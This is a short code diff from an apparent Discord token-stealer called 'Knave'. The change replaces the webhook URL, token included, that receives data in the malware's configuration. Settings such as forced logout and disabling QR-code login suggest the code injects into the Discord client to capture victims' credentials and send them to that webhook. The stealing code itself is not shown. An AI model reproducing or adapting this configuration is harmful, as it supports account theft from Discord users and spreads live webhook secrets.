@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "Knave",
 
-    webhook: "https://discordapp.com/api/webhooks/1050453705033531453/nhZdDQtJx9Jzdsw4Esb2v9BASnfQg30JB0cRWLuZbEA_RE_xW-sYMKAojzEAUJnhvBn4",
+    webhook: "https://discord.com/api/webhooks/1051031045643972641/58WFBKAmT1nyfw2OZCQcflWACRVFBTYWI7lb_ZoOR5LAiaEqDHQTE3TAAnl-siS1FySi",
 
     logout: true,
     disable_qr_code: true,
